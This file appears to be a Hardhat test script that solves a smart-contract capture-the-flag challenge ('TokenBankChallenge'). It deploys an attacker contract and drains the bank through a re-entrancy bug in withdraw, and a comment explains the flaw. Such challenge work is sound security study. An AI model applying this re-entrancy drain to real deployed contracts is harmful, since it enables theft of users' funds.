import crypto, { sign } from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";
import { formatEtherscanTx } from "../utils/format";
import { HDNode } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let contract: Contract; // challenge contract
let tx: any;

const ATTACKER_INITIAL_BALANCE = ethers.utils.parseEther(`500000`);

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(
    "TokenBankChallenge"
  );
  contract = challengeFactory.attach(
    `0xD7FA2C15883faddFB7609fdb1D49175327Cd4Bb0`
  );
});

it("solves the challenge", async function () {
  // there's a re-entrancy issue when doing the withdraw
  // withdraw => token.transfer => msg.sender.tokenFallback() => ...
  // => balance is reset after the token.transfer only
  const attackerFactory = await ethers.getContractFactory("TokenBankAttacker");
  attacker = await attackerFactory.deploy(contract.address);
  const tokenAddress = await contract.token();
  const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
  const token = await tokenFactory.attach(tokenAddress);

  await eoa.provider!.waitForTransaction(attacker.deployTransaction.hash);

  // need to move tokens from eoa to contract for contract to use funds
  // challenge => EOA
  tx = await contract.withdraw(ATTACKER_INITIAL_BALANCE);
  await tx.wait();

  // EOA => attacker
  tx = await token[`transfer(address,uint256)`](
    attacker.address,
    ATTACKER_INITIAL_BALANCE
  );
  await tx.wait();

  // attacker => challenge
  tx = await attacker.deposit();
  await tx.wait();

  const attackerBalance = await contract.balanceOf(attacker.address);
  console.log(`attackerBalance`, attackerBalance.toString());
  expect(attackerBalance).to.eq(ATTACKER_INITIAL_BALANCE);

  tx = await attacker.attack();
  await tx.wait();

  const isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
});
